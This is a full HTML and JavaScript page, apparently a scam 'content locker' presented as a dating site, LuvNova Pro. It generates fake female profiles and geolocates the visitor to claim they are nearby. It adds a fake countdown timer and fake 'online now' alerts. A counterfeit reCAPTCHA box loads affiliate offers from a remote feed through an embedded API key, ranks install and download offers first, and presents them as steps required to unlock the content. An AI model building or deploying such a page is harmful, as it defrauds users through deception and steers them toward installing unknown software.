<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LuvNova Pro - Private Access</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #fe3c72; --bg: #fdf2f5; --white: #ffffff; --onlyfans: #00aff0; }
        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); margin: 0; color: #1c1e21; position: relative; overflow-x: hidden; }
        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('header-pattern_1.png') repeat; opacity: 0.04; z-index: -1; pointer-events: none; }
        .top-bar { background: #222; color: #fff; padding: 8px; text-align: center; font-size: 11px; font-weight: bold; position: relative; z-index: 1001; }
        header { background: #fff; position: sticky; top: 0; z-index: 2000; height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 1px solid #ffd1dc; }
        .header-bg-pattern { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('header-pattern_3.png') repeat; background-size: 80px; opacity: 0.12; z-index: 1; pointer-events: none; }
        .header-left { display: flex; align-items: center; gap: 8px; position: relative; z-index: 5; }
        .site-logo-head { width: 35px; height: 35px; border-radius: 50%; border: 1px solid var(--primary); background: #fff; }
        header h1 { margin: 0; color: var(--primary); font-size: 19px; font-weight: 800; }
        .menu-container { position: relative; z-index: 9999; }
        .menu-btn { color: #555; font-size: 22px; cursor: pointer; padding: 5px; position: relative; }
        .dropdown-menu { display: none; position: absolute; right: 0; top: 45px; background: #fff; border: 1px solid #eee; border-radius: 12px; width: 160px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); z-index: 10000; }
        .dropdown-menu a { display: block; padding: 12px 15px; color: #333; text-decoration: none; font-size: 14px; border-bottom: 1px solid #f8f8f8; }
        .search-container { padding: 12px 15px; background: rgba(255,255,255,0.6); backdrop-filter: blur(10px); border-bottom: 1px solid #eee; }
        #smartSearch { width: 100%; padding: 11px 35px; border-radius: 25px; border: 1px solid #ddd; outline: none; font-size: 13px; box-sizing: border-box; background: #fff; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
        .card { background: var(--white); border-radius: 15px; overflow: hidden; border: 1px solid #eee; display: flex; flex-direction: column; height: 100%; box-shadow: 0 3px 6px rgba(0,0,0,0.03); }
        .card img.main-thumb { width: 100%; height: 180px; object-fit: cover; }
        .info { padding: 10px; display: flex; flex-direction: column; flex-grow: 1; }
        .name-age { font-size: 13px; font-weight: 700; }
        .loc-text { font-size: 10px; color: #28a745; margin-top: 3px; font-weight: bold; }
        .girl-msg { font-size: 10px; color: var(--primary); font-style: italic; height: 32px; margin: 6px 0; overflow: hidden; line-height: 1.3; }
        .social-item { background: #fff0f3; padding: 2px 5px; border-radius: 4px; font-size: 8px; font-weight: 700; color: #d63384; border: 1px dashed #ffb3c1; margin-right: 3px; display: inline-block; margin-bottom: 5px; }
        .btn-connect { background: var(--primary); color: white; width: 100%; padding: 10px; border-radius: 12px; font-weight: bold; border:none; cursor: pointer; font-size: 11px; margin-top: auto; }
        #live-notif { position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%); background: white; padding: 10px 18px; border-radius: 30px; box-shadow: 0 5px 20px rgba(0,0,0,0.15); z-index: 9999; display: flex; align-items: center; gap: 10px; border: 1.5px solid var(--primary); transition: 0.6s; width: 85%; max-width: 320px; }
        .notif-dot { width: 8px; height: 8px; background: #28a745; border-radius: 50%; animation: pulse-dot 1.5s infinite; }
        @keyframes pulse-dot { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
        #locker { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:5000; overflow-y: auto; }
        .locker-inner { max-width: 450px; margin: 0 auto; text-align: center; position: relative; z-index: 5; padding-bottom: 40px; }
        .cover-area { width: 100%; height: 140px; background-size: cover; background-position: center; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; position: relative; }
        .p-header { padding: 0 15px 15px 15px; margin-top: -50px; position: relative; z-index: 10; }
        .p-img-main { width: 90px; height: 90px; border-radius: 50%; border: 4px solid #fff; object-fit: cover; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .stats-row { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin: 15px 10px; }
        .stat-box { background: #fff; border: 1px solid #ffd1dc; border-radius: 12px; padding: 6px; text-align: center; }
        .stat-val { display: block; font-weight: 800; font-size: 11px; color: #333; }
        .stat-of { background: #eaf8ff; border-color: #00aff0; color: #00aff0; }
        .social-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 8px; margin: 15px; padding: 12px; background: rgba(253,249,250,0.9); border-radius: 20px; border: 1px solid #fff; }
        .soc-icon { position: relative; font-size: 20px; padding: 10px; background: #fff; border-radius: 12px; display: flex; justify-content: center; align-items: center; border: 1px solid #eee; cursor: pointer; transition: 0.2s; }
        .soc-lock { position: absolute; bottom: 3px; right: 3px; font-size: 8px; color: #ff0000; background: #fff; border-radius: 50%; padding: 1px; }
        .captcha-area { background: #fff; border: 2px solid #ffd1dc; border-radius: 20px; padding: 20px; margin: 20px; transition: 0.3s; z-index: 10; position: relative; }
        .recaptcha-box { background: #f9f9f9; border: 1px solid #d3d3d3; height: 75px; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; cursor: pointer; border-radius: 6px; }
        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; background: #fff; border-radius: 3px; }
        .checkbox.loading { border-radius: 50%; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        @keyframes shake-anim { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(8px); } 75% { transform: translateX(-8px); } }
        .shake-now { animation: shake-anim 0.4s ease-in-out; border-color: var(--primary) !important; box-shadow: 0 0 20px rgba(254,60,114,0.2) !important; }
        #offers-wrap { display: none; margin-top: 20px; text-align: left; }
        .offer-card { background: #fff; border: 1px solid #eee; border-radius: 15px; padding: 12px; margin-bottom: 12px; display: flex; align-items: center; text-decoration: none; color: #333; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.04); }
        .offer-step-tag { position: absolute; top: 0; right: 0; background: var(--primary); color: #fff; font-size: 8px; padding: 3px 10px; border-bottom-left-radius: 12px; font-weight: bold; }
        .offer-card img { width: 48px; height: 48px; border-radius: 10px; margin-right: 12px; object-fit: cover; background: #f9f9f9; border: 1px solid #eee; }
        .vid-container { width: 92%; max-width: 280px; height: 400px; margin: 20px auto; border-radius: 25px; overflow: hidden; border: 5px solid #fff; background: #000; }
        .vid-container video { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body>
<div class="top-bar">Offer expires in <span id="timer">05:00</span></div>
<header>
    <div class="header-bg-pattern"></div>
    <div class="header-left"><img src="logo.jpg" class="site-logo-head" onerror="this.src='logo.png'"><h1>LuvNovaPRO</h1></div>
    <div class="menu-container"><div class="menu-btn" onclick="toggleMenu()"><i class="fas fa-bars"></i></div><div class="dropdown-menu" id="mainMenu"><a href="#">Login</a><a href="#">Settings</a><a href="#">Privacy</a></div></div>
</header>
<div class="search-container"><input type="text" id="smartSearch" placeholder="Search profiles near you..." onkeyup="filterProfiles()"></div>
<div id="main-grid" class="grid"></div>
<div id="live-notif">
    <div class="notif-dot"></div>
    <div style="font-size: 11px; font-weight: bold; color: #444;"><span id="notif-name">Zoe</span> is online in <span class="loc-var" style="color:var(--primary)">Your Area</span></div>
</div>
<div id="locker">
    <div id="lockerDecor" style="position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:1; opacity:0.3;"></div>
    <div class="locker-inner">
        <div class="cover-area" id="p-cover"><i class="fas fa-chevron-left" onclick="closeLocker()" style="position:absolute; left:15px; top:15px; padding:12px; color:#fff; background:rgba(0,0,0,0.4); border-radius:50%; cursor:pointer; z-index:20;"></i></div>
        <div class="p-header">
            <img id="p-img" src="" class="p-img-main">
            <h3 style="margin:8px 0 0 0; font-size:20px;"><span id="p-name"></span> <img src="verified.png" class="verified-badge" style="width:18px; vertical-align:middle;"></h3>
            <p id="sync-text" style="font-size:11px; color:#888; margin-top:5px;"><i class="fas fa-circle-notch fa-spin"></i> Syncing...</p>
            <div class="stats-row">
                <div class="stat-box" onclick="remindCaptcha()"><i class="fas fa-camera"></i><span class="stat-val" id="st-ph">0 Photos</span></div>
                <div class="stat-box" onclick="remindCaptcha()"><i class="fas fa-video"></i><span class="stat-val" id="st-vi">0 Videos</span></div>
                <div class="stat-box stat-of" onclick="remindCaptcha()"><img src="only.fans.png" style="width:18px; margin-bottom:2px;" onerror="this.src='https://cdn-icons-png.flaticon.com/512/174/174855.png'"><span style="font-size:7px; font-weight:900; color:#00aff0; display:block;">FREE ACCESS</span></div>
            </div>
            <div class="social-grid">
                <div class="soc-icon" onclick="remindCaptcha()"><i class="fab fa-whatsapp" style="color:#25D366;"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" onclick="remindCaptcha()"><i class="fab fa-instagram" style="color:#E1306C;"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" onclick="remindCaptcha()"><i class="fab fa-snapchat-ghost" style="color:#FFFC00;"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" onclick="remindCaptcha()"><i class="fab fa-telegram-plane" style="color:#0088cc;"></i><i class="fas fa-lock soc-lock"></i></div>
                <div class="soc-icon" onclick="remindCaptcha()"><i class="fab fa-tiktok" style="color:#000;"></i><i class="fas fa-lock soc-lock"></i></div>
            </div>
        </div>
        <div class="captcha-area" id="captcha-area">
            <div class="recaptcha-box" onclick="triggerCaptcha()">
                <div style="display:flex; align-items:center; gap:15px;"><div class="checkbox" id="captcha-box"></div><span style="font-size:15px; font-weight:600; color:#555;">I'm not a robot</span></div>
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" style="width:28px; opacity:0.7;">
            </div>
            <div id="offers-wrap"><p style="font-size:12px; color:var(--primary); font-weight:bold; margin: 15px 0; text-align:center;">Final Step: Verify for FREE Access</p><div id="offers-list"></div></div>
        </div>
        <div id="video-placeholder" class="vid-container"><video id="tutorialVideo" loop playsinline muted><source src="tutorial.mp4" type="video/mp4"></video></div>
    </div>
</div>
<script>
    let userCity = "Your Area"; let countryName = "Your Country";
    const intlPool = [
        {city: "London", country: "United Kingdom"}, {city: "Paris", country: "France"}, 
        {city: "Berlin", country: "Germany"}, {city: "Sydney", country: "Australia"},
        {city: "Toronto", country: "Canada"}, {city: "Madrid", country: "Spain"}
    ];
    const realBios = ["Looking for someone tonight. ❤️", "Serious connection only.", "Active now, let's chat. 🔥", "Unlock my private gallery.", "Join me on my private channel.", "New photos uploaded today!", "I am closer than you think.", "Exclusive content inside 🔒"];

    function fetchLocation() {
        $.ajax({
            url: "https://ipapi.co/jsonp/", dataType: "jsonp",
            success: function(data) {
                if(data && data.city) {
                    userCity = data.city; countryName = data.country_name;
                    $(".loc-var").text(userCity + ", " + countryName);
                    updateAllLocations();
                    setTimeout(showLiveNotif, 4000);
                }
            },
            error: function() { renderGrid(); }
        });
    }

    function updateAllLocations() {
        $(".card").each(function(idx) {
            let locEl = $(this).find(".loc-text");
            let btnEl = $(this).find(".btn-connect");
            if(locEl.text().includes("Your Area")) {
                let finalLoc = (idx % 3 === 0) ? (userCity + ", " + countryName) : (intlPool[idx % intlPool.length].city + ", " + intlPool[idx % intlPool.length].country);
                locEl.html('<i class="fas fa-map-marker-alt"></i> ' + finalLoc);
                // تحديث سمة الموقع في الزر لضمان انتقاله للوكر
                btnEl.attr("onclick", btnEl.attr("onclick").replace("'Your Area'", "'" + finalLoc + "'"));
            }
        });
    }

    function toggleMenu() { $('#mainMenu').fadeToggle(200); }
    const names = ["Maddie", "Sienna", "Chloe", "Amber", "Tiffany", "Elena", "Sophie", "Isabella", "Ava", "Mia", "Zoe", "Layla"];
    function showLiveNotif() {
        $("#notif-name").text(names[Math.floor(Math.random()*names.length)]);
        $("#live-notif").css("bottom", "20px");
        setTimeout(() => { $("#live-notif").css("bottom", "-100px"); setTimeout(showLiveNotif, 12000); }, 5000);
    }

    function createCard(type, i) {
        let name = names[i % names.length] + " " + String.fromCharCode(65 + (i % 26)) + ".";
        let age = (type === 'young') ? Math.floor(Math.random()*11)+24 : (type === 'moms') ? Math.floor(Math.random()*11)+35 : Math.floor(Math.random()*11)+46;
        return `<div class="card" data-info="${name.toLowerCase()}">
            <img src="${type}_${i}.jpg" class="main-thumb" loading="lazy" onerror="this.parentElement.style.display='none'">
            <div class="info">
                <div class="name-age">${name}, ${age}</div>
                <div class="loc-text"><i class="fas fa-map-marker-alt"></i> Your Area</div>
                <span class="girl-msg">"${realBios[i % realBios.length]}"</span>
                <div style="margin-top:5px;"><span class="social-item">🔒 WhatsApp</span><span class="social-item">🔒 Snapchat</span></div>
                <button class="btn-connect" onclick="openLocker('${name}', '${type}_${i}.jpg', 'Your Area')">Connect Now</button>
            </div>
        </div>`;
    }

    function renderGrid() {
        let cards = [];
        for (let i = 1; i <= 60; i++) { cards.push(createCard('young', i)); cards.push(createCard('moms', i)); cards.push(createCard('granny', i)); }
        cards.sort(() => Math.random() - 0.5);
        document.getElementById('main-grid').innerHTML = cards.join('');
        fetchLocation();
    }
    renderGrid();

    function openLocker(name, img, loc) {
        document.getElementById('p-name').innerText = name;
        document.getElementById('p-img').src = img;
        document.getElementById('st-ph').innerText = (Math.floor(Math.random() * 50) + 20) + " Photos";
        document.getElementById('st-vi').innerText = (Math.floor(Math.random() * 5) + 2) + " Videos";
        document.getElementById('p-cover').style.backgroundImage = `url('cover_${Math.floor(Math.random()*23)+1}.jpg')`;
        document.getElementById('locker').style.display = 'block';
        spawnLockerDecor();
        const vid = document.getElementById('tutorialVideo');
        vid.muted = false; vid.play().catch(() => { vid.muted = true; vid.play(); });
        // استخدام الموقع القادم من الكرت بالضبط
        setTimeout(() => { document.getElementById('sync-text').innerHTML = `<span style="color:#28a745;font-weight:bold;"><i class="fas fa-circle" style="font-size:7px;animation:pulse 1.5s infinite"></i> Active Now in ${loc}</span>`; }, 1000);
    }

    function triggerCaptcha() {
        const box = document.getElementById('captcha-box');
        if(box.classList.contains('loading')) return;
        box.classList.add('loading');
        setTimeout(() => { document.getElementById('offers-wrap').style.display = 'block'; fetchOffers(); }, 1200);
    }

    function fetchOffers() {
        const feedUrl = "https://d5b3uz3fo8hn3.cloudfront.net/public/offers/feed.php?user_id=570304&api_key=0da06ad8edf91a87f3387591d987d7bb&callback=?";
        $.getJSON(feedUrl, function(offers) {
            const englishOffers = offers.filter(o => !/[\u0600-\u06FF]/.test(o.title + (o.anchor || "")));
            englishOffers.sort((a, b) => {
                const aK = (a.title + a.anchor).toLowerCase(); const bK = (b.title + b.anchor).toLowerCase();
                const isA = aK.includes('install') || aK.includes('download'); const isB = bK.includes('install') || bK.includes('download');
                return (isA === isB) ? 0 : isA ? -1 : 1;
            });
            let html = '';
            englishOffers.slice(0, 4).forEach((offer, index) => {
                let title = offer.anchor || offer.title || "Identity Verification";
                let rawIcon = offer.icon || "";
                if (rawIcon.startsWith('//')) rawIcon = 'https:' + rawIcon;
                // Google Proxy للأيقونات
                let icon = `https://images1-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&refresh=2592000&url=${encodeURIComponent(rawIcon)}`;
                const lowT = title.toLowerCase();
                if(lowT.includes('tiktok')) icon = "https://cdn-icons-png.flaticon.com/512/3046/3046121.png";
                if(lowT.includes('instagram')) icon = "https://cdn-icons-png.flaticon.com/512/174/174855.png";

                html += `<a href="${offer.url}" target="_blank" class="offer-card">
                    <div class="offer-step-tag">STEP ${index+1}</div>
                    <img src="${icon}" onerror="this.src='https://cdn-icons-png.flaticon.com/512/1162/1162933.png'">
                    <div><div style="font-size:13px; font-weight:800; color:#222;">${title}</div><div style="font-size:10px; color:var(--primary); font-weight:bold; margin-top:3px;">[COMPLETE TO UNLOCK]</div></div>
                </a>`;
            });
            $("#offers-list").html(html || "<p style='text-align:center; font-size:11px;'>Checking secure tasks...</p>");
        });
    }

    function remindCaptcha() { const area = $('#captcha-area'); area.addClass('shake-now'); setTimeout(() => area.removeClass('shake-now'), 400); }
    function filterProfiles() { let input = $('#smartSearch').val().toLowerCase(); $('.card').each(function() { $(this).toggle($(this).text().toLowerCase().includes(input)); }); }
    function closeLocker() { $('#locker').hide(); document.getElementById('tutorialVideo').pause(); }
    function spawnLockerDecor() {
        const container = document.getElementById('lockerDecor'); container.innerHTML = '';
        const items = ['🌸', '❤️', '🌹', '💖'];
        for (let i = 0; i < 12; i++) {
            const span = document.createElement('span'); span.className = 'decor-item';
            span.innerText = items[Math.floor(Math.random() * items.length)];
            span.style.cssText = `position:absolute; left:${Math.random()*95}%; top:${Math.random()*95}%;`;
            container.appendChild(span);
        }
    }
    let time = 300; setInterval(() => { let min = Math.floor(time / 60); let sec = time % 60; document.getElementById('timer').innerText = `0${min}:${sec < 10 ? '0'+sec : sec}`; if(time > 0) time--; }, 1000);
</script>
</body>
</html>
